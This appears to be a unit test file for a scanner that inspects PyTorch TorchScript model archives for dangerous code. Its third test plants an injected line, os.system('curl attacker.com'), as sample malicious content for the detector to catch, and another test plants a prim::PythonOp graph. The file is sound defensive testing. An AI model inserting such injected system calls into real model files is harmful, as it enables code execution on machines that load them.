"""
Unit tests for TorchScriptAnalyzer.
Validates inspection of PyTorch JIT code entries and detection of prim::PythonOp and dangerous calls.
"""

import zipfile
from scanner.analyzers.torchscript_analyzer import TorchScriptAnalyzer
from scanner.rules.dangerous_symbols import RiskLevel


def test_torchscript_clean_archive(tmp_path):
    analyzer = TorchScriptAnalyzer()
    ts_file = tmp_path / "model_clean.pt"
    clean_code = "def forward(x):\n    return aten.relu(x)\n"
    with zipfile.ZipFile(str(ts_file), "w") as zf:
        zf.writestr("code/__torch__/model.py", clean_code)

    findings = analyzer.analyze_archive(str(ts_file))
    assert len(findings) == 0


def test_torchscript_python_op_detected(tmp_path):
    analyzer = TorchScriptAnalyzer()
    ts_file = tmp_path / "model_pythonop.pt"
    malicious_code = "graph(%x):\n    %y = prim::PythonOp(%x)\n    return (%y)\n"
    with zipfile.ZipFile(str(ts_file), "w") as zf:
        zf.writestr("code/__torch__/model.py", malicious_code)

    findings = analyzer.analyze_archive(str(ts_file))
    assert any(f.rule_id == "TORCHSCRIPT-OP-CRITICAL" for f in findings)


def test_torchscript_forbidden_call_detected(tmp_path):
    analyzer = TorchScriptAnalyzer()
    ts_file = tmp_path / "model_exec.pt"
    injected_code = "import os\nos.system('curl attacker.com')\n"
    with zipfile.ZipFile(str(ts_file), "w") as zf:
        zf.writestr("code/__torch__/model.py", injected_code)

    findings = analyzer.analyze_archive(str(ts_file))
    assert any(f.rule_id == "TORCHSCRIPT-DANGEROUS-IMPORT" for f in findings)
    assert any(f.severity == RiskLevel.CRITICAL for f in findings)
